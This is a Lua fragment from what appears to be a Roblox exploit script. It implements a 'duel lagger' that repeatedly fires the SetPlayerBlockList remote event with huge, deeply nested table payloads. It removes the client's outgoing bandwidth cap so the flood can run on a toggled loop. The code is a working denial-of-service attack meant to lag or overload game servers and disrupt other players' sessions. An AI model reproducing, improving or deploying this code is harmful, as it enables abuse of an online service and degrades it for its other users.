-- ============================================================
-- CORE LOGIC
-- ============================================================
local function duelBomb(amt)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, amt do 
        local t = {}
        table.insert(z, t)
        z = t 
    end
    local max = math.min(499999 / (amt + 2), 1500)
    for i = 1, max do 
        table.insert(main, spam) 
    end
    pcall(function() 
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) 
    end)
end

local function toggleDuelLagger()
    State.duelLaggerActive = not State.duelLaggerActive
    
    if duelLaggerStatusLabel then
        duelLaggerStatusLabel.Text = State.duelLaggerActive and "STATUS: RUNNING" or "STATUS: SLEEPING"
        duelLaggerStatusLabel.TextColor3 = State.duelLaggerActive and C.accent1 or C.textSub
    end
    
    if row and rowStroke then
        TweenService:Create(row, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
            BackgroundColor3 = State.duelLaggerActive and C.cardActive or C.card
        }):Play()
        TweenService:Create(rowStroke, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
            Color = State.duelLaggerActive and C.accent1 or C.border
        }):Play()
    end
    
    if duelLaggerSwitchBall then
        TweenService:Create(duelLaggerSwitchBall, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Position = State.duelLaggerActive and UDim2.new(1, -15, 0.5, -5) or UDim2.new(0, 5, 0.5, -5),
            BackgroundColor3 = State.duelLaggerActive and C.text or C.dotOff,
        }):Play()
    end
    
    if State.duelLaggerActive then
        State.duelLaggerThread = task.spawn(function()
            while State.duelLaggerActive do
                pcall(function() 
                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) 
                end)
                duelBomb(270)
                task.wait(duelLaggerWaitTime)
            end
        end)
    else
        if State.duelLaggerThread then 
            task.cancel(State.duelLaggerThread)
            State.duelLaggerThread = nil 
        end
    end
end

